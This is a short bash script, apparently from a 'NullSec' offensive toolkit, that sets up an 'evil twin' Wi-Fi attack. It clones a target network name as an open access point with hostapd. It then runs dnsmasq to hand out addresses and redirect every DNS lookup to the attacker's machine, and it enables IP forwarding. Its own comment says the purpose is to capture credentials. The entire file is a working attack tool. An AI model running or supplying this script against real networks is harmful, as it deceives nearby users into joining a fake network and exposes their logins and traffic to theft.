#!/bin/bash
# NullSec Evil Twin Payload
# Creates a rogue AP to capture credentials

TARGET_SSID="$1"
CHANNEL="${2:-6}"
IFACE="${3:-wlan1}"

if [[ -z "$TARGET_SSID" ]]; then
    echo "Usage: $0 <ssid> [channel] [interface]"
    exit 1
fi

echo "[*] NullSec Evil Twin"
echo "[*] SSID: $TARGET_SSID"
echo "[*] Channel: $CHANNEL"

# Create hostapd config
cat > /tmp/hostapd-evil.conf << CONF
interface=$IFACE
driver=nl80211
ssid=$TARGET_SSID
hw_mode=g
channel=$CHANNEL
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
CONF

# Create dnsmasq config
cat > /tmp/dnsmasq-evil.conf << CONF
interface=$IFACE
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/192.168.1.1
CONF

# Configure interface
ifconfig $IFACE up 192.168.1.1 netmask 255.255.255.0

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Start services
hostapd /tmp/hostapd-evil.conf &
sleep 2
dnsmasq -C /tmp/dnsmasq-evil.conf &

echo "[+] Evil Twin running on $IFACE"
echo "[+] Press Ctrl+C to stop"
wait
